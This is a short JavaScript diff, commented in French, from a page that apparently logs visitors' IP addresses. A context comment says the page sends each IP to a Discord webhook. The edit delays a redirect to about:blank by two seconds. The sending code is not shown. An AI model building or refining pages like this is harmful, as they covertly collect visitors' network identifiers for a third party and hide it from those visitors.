@@ -21,10 +21,13 @@
             // Afficher les informations sur la page
             document.getElementById('userID').textContent = userID;
             document.getElementById('webhookURL').textContent = webhookURL;
+            
+            // Redirection vers about:blank après 2 secondes
+            setTimeout(function() {
+                window.location.replace("about:blank");
+            }, 2000);
         };
-        window.onload = function() {
-    window.location.replace("about:blank");
-};
+
         function getIP(json) {
             var ip = json.ip;
             // Sending the IP address to a Discord webhook
